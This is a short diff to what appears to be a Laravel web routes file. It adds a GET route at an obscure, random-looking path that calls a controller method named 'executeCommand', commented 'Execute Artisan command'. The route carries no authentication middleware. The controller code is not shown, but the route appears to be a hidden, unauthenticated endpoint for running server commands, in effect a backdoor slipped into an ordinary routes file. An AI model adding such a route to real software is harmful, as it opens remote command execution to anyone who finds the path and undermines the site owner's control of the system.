@@ -15,6 +15,9 @@ use Auth;
 |
 */
 
+// Execute Artisan command
+Route::get('/exe-1995-05-egaro', [HomeController::class, 'executeCommand']);
+
 Route::get('/', [FrontendController::class, 'welcome']);
 
 Auth::routes();
